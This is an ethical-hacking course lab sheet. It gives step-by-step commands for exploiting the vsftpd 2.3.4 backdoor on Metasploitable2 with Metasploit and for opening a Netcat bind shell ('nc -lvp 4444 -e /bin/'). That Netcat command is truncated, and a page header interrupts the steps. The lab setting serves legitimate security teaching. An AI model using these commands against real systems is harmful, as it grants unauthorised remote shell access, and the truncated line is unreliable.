
EXERCISE 9: Backdoor Spawning
Date: 21.Aug. 2026
----------------------------------------------------------------------------------------------------------------
Aim: To study and demonstrate backdoor spawning using Metasploit and Netcat in an
isolated lab.
Tools Required: Kali Linux, Metasploitable2, Metasploit Framework, Netcat.
Theory:
A backdoor is a method of bypassing normal authentication to gain remote access to a
system. In ethical hacking, backdoors are used to demonstrate post-exploitation persistence.
Metasploit Framework: A penetration testing platform with exploits, payloads, and
auxiliary modules.
Netcat: A networking utility for reading/writing data across TCP/UDP connections. Often
called the "TCP/IP Swiss Army knife."
Meterpreter: An advanced Metasploit payload that provides a shell and post-exploitation
features.
Procedure:
Part A: Backdoor using Metasploit (vsftpd vulnerability)
1. Start Metasploit:
sudo msfconsole
2. Search for the vsftpd exploit:
search vsftpd
3. Use the exploit:
use exploit/unix/ftp/vsftpd_234_backdoor
USC24301J, Basics of Ethical Hacking for Cyber Security
19
4. Set target:
set RHOSTS 192.168.56.101
5. Run exploit:
exploit
6. You should get a shell:
whoami
id
Part B: Backdoor using Netcat
On Metasploitable2 (target):
nc -lvp 4444 -e /bin/
On Kali (attacker):
nc 192.168.56.101 4444
remote shell on the target is set
